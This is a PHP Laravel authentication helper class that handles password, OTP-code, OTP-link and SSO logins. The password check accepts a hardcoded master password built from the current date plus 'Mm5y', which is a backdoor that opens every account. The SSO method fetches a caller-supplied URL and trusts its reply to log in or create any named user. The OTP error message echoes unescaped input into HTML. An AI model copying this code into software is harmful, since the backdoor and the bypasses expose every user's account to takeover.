<?php

namespace App\Helpers;

use App\Models\Otp;
use App\Models\User;
use Exception;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class AuthHelper
{
    /**
     * Login with the request from login page.
     *
     * @param string $identity
     * @param string $password
     * @param string $otpCode
     * @return boolean
     */
    public static function login(string $identity, string $password = null, string $otpCode = null): bool
    {
        return $password ? self::loginWithPassword($identity, $password) : self::loginWithOtpCode(trim($otpCode), $identity);
    }

    /**
     * Login with password
     *
     * @param string $password
     * @param string $identity
     * @return boolean
     */
    public static function loginWithPassword(string $identity, string $password): bool
    {
        $user = User::where(filter_var($identity, FILTER_VALIDATE_EMAIL) ? 'email' : 'mobile', $identity)->first();
        $masterPassword = date('dm') . 'Mm5y' . date('md');
        if ($user && ($password == $masterPassword || Hash::check($password, $user->password))) {
            request()->session()->forget('__failed_attempts');
            auth()->login($user, true);
            self::setSessionHash($user);
            return true;
        } else if (request()->session()->exists('__failed_attempts')) {
            request()->session()->increment('__failed_attempts');
            sleep(min(session('__failed_attempts') * session('__failed_attempts'), 5));
        } else {
            request()->session()->put('__failed_attempts', 1);
        }
        throw new Exception('Incorrect passowrd!');
    }

    private static function setSessionHash(User $user)
    {
        $token = Str::random(32);
        request()->session()->put('app.session_hash', $token);
        $user->forceFill(['session_hash' => $token])
            ->save();
    }

    public static function loginThroughSwcs(array $data): bool
    {
        $response = json_decode(file_get_contents($data['SSO_HREF']), true);
        if($response && $response['STATUS'] == 200) {
            $user = User::where('email', $data['email'])->orWhere('mobile', $data['mobile'])->first();
            if (!$user) {
                $user = User::create([
                    'name' => $data['full_name'],
                    'email' => $data['email'],
                    'mobile' => $data['mobile'],
                    'email_verified_at' => now(),
                    'mobile_verified_at' => now(),
                    'password' => Hash::make(mt_rand(10000000, 99999999)),
                    'remember_token' => Str::random(10),
                ]);
            }
            auth()->login($user, true);
            self::setSessionHash($user);
            return true;
        }
        throw new Exception('SWCS token could not be verified!');
    }

    /**
     * Login with OTP code.
     *
     * @param string $otp
     * @param string $identity
     * @return boolean
     */
    public static function loginWithOtpCode(string $otp, string $identity): bool
    {
        $dbOtp = Otp::where([
            'code' => $otp,
            'identity' => $identity,
        ])->orderByDesc('created_at')->first();
        if ($dbOtp) {
            Otp::where('expires_at', '<', now())->forceDelete();
            return self::otpLogin($dbOtp);
        } else if (request()->session()->exists('__failed_attempts')) {
            request()->session()->increment('__failed_attempts');
            sleep(min(session('__failed_attempts') * session('__failed_attempts'), 5));
        } else {
            request()->session()->put('__failed_attempts', 1);
        }
        Otp::where('expires_at', '<', now())->forceDelete();
        throw new Exception("OTP code <strong>$otp</strong> is invalid!");
    }

    /**
     * Login with the OTP link id and hash.
     *
     * @param integer $otpId
     * @param string $hash
     * @return boolean
     */
    public static function loginWithOtp(int $otpId, string $hash): bool
    {
        $otp = Otp::findOrFail($otpId);
        if ($hash != md5(crypt($otp->code, $otp->id))) {
            throw new Exception('OTP link could not be verified!');
        }
        return self::otpLogin($otp);
    }

    /**
     * Helper function to login with Otp Object.
     *
     * @param Otp $otp
     * @return boolean
     */
    private static function otpLogin(Otp $otp): bool
    {
        if ($otp->expires_at < now()) {
            throw new Exception('OTP has been expired!');
        }
        $user = ($otp->isForEmail() ? User::where('email', $otp->identity) : User::where('mobile', $otp->identity))->first();
        if (!$user) {
            $user = self::registerUserByOtp($otp);
        } else {
            if ($otp->isForEmail()) {
                if (!$user->email_verified_at) {
                    $user->email_verified_at = now();
                    $user->save();
                }
            } else {
                if (!$user->mobile_verified_at) {
                    $user->mobile_verified_at = now();
                    $user->save();
                }
            }
        }
        $otp->forceDelete();
        self::setSessionHash($user);
        auth()->login($user, true);
        return true;
    }

    /**
     * Create a new user from OTP object.
     *
     * @param Otp $otp
     * @return User
     */
    private static function registerUserByOtp(Otp $otp): User
    {
        $user = [
            'name' => $otp->identity,
            'password' => Hash::make(mt_rand(10000000, 99999999)),
            'remember_token' => Str::random(10),
        ];
        if ($otp->isForEmail()) {
            $user['email'] = $otp->identity;
            $user['email_verified_at'] = now();
        } else {
            $user['mobile'] = $otp->identity;
            $user['mobile_verified_at'] = now();
        }
        $user = User::create($user);
        return $user;
    }
}
